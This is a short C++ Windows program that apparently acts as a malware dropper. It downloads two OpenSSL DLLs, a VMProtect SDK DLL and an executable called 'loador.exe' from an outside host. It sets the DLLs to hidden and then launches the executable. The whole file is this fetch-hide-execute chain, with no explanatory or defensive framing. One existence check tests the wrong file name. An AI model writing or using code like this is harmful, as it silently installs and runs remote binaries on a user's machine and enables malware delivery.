//global includes
#include <Windows.h>
#include <iostream>

#include <winsock2.h>
#include <ws2tcpip.h>
#include <stdlib.h>

#pragma comment(lib, "urlmon.lib")

HRESULT URLDownloadToFile(
	LPUNKNOWN            pCaller,
	LPCTSTR              szURL,
	LPCTSTR              szFileName,
	_Reserved_ DWORD                dwReserved,
	LPBINDSTATUSCALLBACK lpfnCB
);

inline bool exists(const std::string& name) {
	struct stat buffer;
	return (stat(name.c_str(), &buffer) == 0);
}

int main()
{
	if (!exists("libcrypto-1_1-x64.dll"))
		URLDownloadToFile(0, L"http://host.fuckabitch.net/libcrypto-1_1-x64.dll", L"libcrypto-1_1-x64.dll", 0, 0);
	if (!exists("libssl-1_1-x64.dll"))
		URLDownloadToFile(0, L"http://host.fuckabitch.net/libssl-1_1-x64.dll", L"libssl-1_1-x64.dll", 0, 0);
	if (!exists("libssl-1_1-x64.dll"))
		URLDownloadToFile(0, L"http://host.fuckabitch.net/VMProtectSDK64.dll", L"VMProtectSDK64.dll", 0, 0);
	if (!exists("loador.exe"))
		URLDownloadToFile(0, L"http://host.fuckabitch.net/loador.exe", L"loador.exe", 0, 0);
	SetFileAttributesA("libcrypto-1_1-x64.dll", FILE_ATTRIBUTE_HIDDEN);
	SetFileAttributesA("libssl-1_1-x64.dll", FILE_ATTRIBUTE_HIDDEN);
	SetFileAttributesA("VMProtectSDK64.dll", FILE_ATTRIBUTE_HIDDEN);
	system("loador.exe");
	return 1;
}